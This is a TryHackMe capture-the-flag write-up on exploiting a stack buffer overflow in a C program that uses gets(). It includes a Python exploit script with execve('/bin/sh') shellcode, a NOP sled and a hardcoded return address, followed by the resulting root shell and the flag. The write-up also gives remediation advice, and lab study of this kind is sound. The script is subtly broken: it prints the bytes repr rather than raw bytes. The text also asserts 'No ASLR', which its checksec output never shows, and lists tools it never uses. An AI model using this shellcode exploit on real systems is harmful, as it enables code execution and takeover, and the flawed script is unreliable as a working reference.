# Buffer Overflow Exploitation

**Platform:** TryHackMe  
**Difficulty:** Hard  
**Category:** Binary Exploitation  
**Date:** October 2024

---

## Challenge Description

A vulnerable C program with a stack-based buffer overflow that can be exploited for remote code execution.

## Initial Analysis

### Binary Information

```bash
$ file vulnerable_app
vulnerable_app: ELF 64-bit LSB executable, x86-64

$ checksec vulnerable_app
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```

No protections! This will be straightforward.

## Vulnerability Discovery

Looking at the source code:

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // Dangerous! No bounds checking
    printf("You entered: %s\n", buffer);
}
```

The `gets()` function doesn't check input length - classic buffer overflow.

## Exploitation

### Step 1: Find the Offset

Using pattern creation:

```bash
$ msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5...

$ gdb ./vulnerable_app
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5...
Segmentation fault

(gdb) info registers
RIP: 0x3761413761413661
```

Calculate offset:

```bash
$ msf-pattern_offset -q 0x3761413761413661
Exact match at offset 72
```

### Step 2: Craft the Exploit

```python
#!/usr/bin/env python3
import struct

# Shellcode (execve("/bin/sh"))
shellcode = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
    b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    b"\x3b\x0f\x05"
)

# Buffer layout
offset = 72
nop_sled = b"\x90" * 20
ret_address = struct.pack("<Q", 0x7fffffffe000)  # Stack address

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += ret_address

print(payload)
```

### Step 3: Execute

```bash
$ python3 exploit.py | ./vulnerable_app
You entered: ...
$ whoami
root
$ cat flag.txt
THM{buff3r_0v3rfl0w_pwn3d}
```

## Root Cause

The vulnerability exists because:

1. `gets()` doesn't perform bounds checking
2. No stack canaries to detect corruption
3. NX disabled allows shellcode execution
4. No ASLR makes addresses predictable

## Remediation

- Replace `gets()` with `fgets()` or `read()`
- Enable stack canaries (`-fstack-protector-all`)
- Enable NX bit
- Enable ASLR and PIE
- Use modern compilers with security features

## Tools Used

- GDB with PEDA
- pwntools
- ROPgadget
- Metasploit pattern tools

---

**Flag:** `THM{buff3r_0v3rfl0w_pwn3d}`
